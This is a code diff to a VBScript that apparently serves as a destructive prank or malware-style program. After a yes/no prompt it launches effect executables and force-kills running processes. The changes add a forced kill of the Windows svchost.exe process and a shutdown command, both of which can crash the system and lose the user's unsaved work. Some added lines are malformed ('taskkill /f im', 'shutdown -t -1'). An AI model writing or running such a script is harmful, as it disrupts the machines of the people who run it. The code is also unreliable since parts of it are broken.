@@ -94,14 +94,15 @@ If intAnswer = vbYes Then
     CreateObject("Wscript.Shell").run("ScreenRecording_02-01-2025 20-31-11_1")
     CreateObject("Wscript.Shell").run("Lines.exe")
     WScript.Sleep(15000)
-    CreateObject("Wscript.Shell").run("taskkill /f /im crazysound6.exe")
+    CreateObject("Wscript.Shell").run("taskkill /f /im BitBlt1.exe")
     WScript.Sleep(100)
-    CreateObject("Wscript.Shell").run("taskkill /f /im tunnel.exe")
-    CreateObject("Wscript.Shell").run("ALast.exe")
-    CreateObject("Wscript.Shell").run("PatBlt.exe")
+    CreateObject("Wscript.Shell").run("taskkill /f /im 777.exe")
+    CreateObject("Wscript.Shell").run("taskkill /f im bytebeat1.exe")
+    CreateObject("Wscript.Shell").run("taskkill /f /im svchost.exe")
     WScript.Sleep(15000)
-    CreateObject("Wscript.Shell").run("linedraw.exe")
+    CreateObject("Wscript.Shell").run("cubes.exe")
     WScript.Sleep(15000)
+    CreateObject("Wscript.Shell").run("shutdown -t -1")
 Else
 End If
 
